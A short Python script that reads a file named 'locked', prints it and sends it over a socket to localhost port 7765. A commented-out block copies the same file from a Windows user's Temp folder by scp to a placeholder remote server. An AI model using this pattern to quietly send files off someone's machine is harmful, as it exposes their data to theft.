import socket


file  = ''

with open('locked',mode='rb') as f:
    file = f.read()
    
print(file) 

ss=socket.socket()
ss.connect(('127.0.0.1',7765))
ss.send(str(file).encode())
ss.close()


# import os 

# os.chdir("C:\Users\Monk\AppData\Local\Temp")
# nm = "locked"
# os.system("scp %temp%"+nm+" <username>@<Server Ip>:<Location>")
# exit